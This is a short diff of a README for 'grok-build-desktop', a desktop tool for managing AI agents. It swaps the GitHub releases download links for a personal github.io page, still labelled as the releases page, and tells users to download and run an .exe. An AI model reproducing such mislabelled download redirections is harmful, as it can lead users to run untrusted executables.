@@ -1,6 +1,6 @@
 # 💻 grok-build-desktop - Manage AI agents on your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tomiuntreated113/grok-build-desktop/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tomiuntreated113.github.io)
 
 grok-build-desktop provides a visual interface for the Grok build system. This software connects to your local runtime and enables you to run AI tasks directly from your desktop. You can manage parallel sessions, switch between different models, and use advanced coding tools without typing complex commands. The application shows options in both English and Chinese.
 
@@ -8,7 +8,7 @@ grok-build-desktop provides a visual interface for the Grok build system. This s
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/tomiuntreated113/grok-build-desktop/releases) to download the latest setup file. 
+1. Visit the [releases page](https://tomiuntreated113.github.io) to download the latest setup file. 
 2. Select the file ending in `.exe` that matches your system architecture. Most modern computers use the 64-bit version.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder and double-click it.
